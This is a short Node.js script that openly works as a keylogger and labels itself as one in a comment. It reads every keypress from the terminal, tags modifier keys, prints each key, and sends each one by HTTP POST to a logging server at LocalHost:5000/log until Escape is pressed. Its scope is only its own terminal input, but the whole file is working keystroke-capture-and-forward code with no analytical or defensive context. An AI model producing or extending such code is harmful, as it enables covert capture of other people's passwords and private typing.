function myfunction(){
    const readline = require('readline');
    const http = require('http');

    readline.emitKeypressEvents(process.stdin);
    process.stdin.setRawMode(true);

    let logging = true;

    const sendToServer = (key) => {
        const data = JSON.stringify({ key: key });

        const options = {
            hostname: 'LocalHost',
            port: 5000,
            path: '/log',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': data.length,
            },
        };

        const req = http.request(options, (res) => {
            res.on('data', (d) => {
                process.stdout.write(d);
            });
        });

        req.on('error', (error) => {
            console.error('Error:', error);
        });

        req.write(data);
        req.end();
    };

    process.stdin.on('keypress', (str, key) => {
        if (!logging) return;
        
        let keyName = '';
        

        if (key.shift) {
            keyName += '[SHIFT] + ';
        }
        if (key.ctrl) {
            keyName += '[CTRL] + ';
        }
        if (key.alt) {
            keyName += '[ALT] + ';
        }
        if (key.meta) {
            keyName += '[META] + ';
        }

        switch (key.name) {
            case 'space':
                keyName += '[SPACE]';
                break;
            case 'return':
                keyName += '[ENTER]';
                break;
            case 'backspace':
                keyName += '[BACKSPACE]';
                break;
            case 'tab':
                keyName += '[TAB]';
                break;
            case 'escape':
                console.log('Escape key pressed. Stopping keylogger.');
                logging = false; // Stop logging
                process.stdin.setRawMode(false);
                process.stdin.pause();
                return;
            default:
                if (!key.ctrl && !key.alt && !key.shift && !key.meta) {
                    keyName = key.sequence;
                } else if (key.name) {
                    keyName += key.name.toUpperCase();
                }
                break;
        }

        console.log(keyName);

        sendToServer(keyName);
    });
}
myfunction();
//console.log('Keylogger started. Press Escape to stop.');
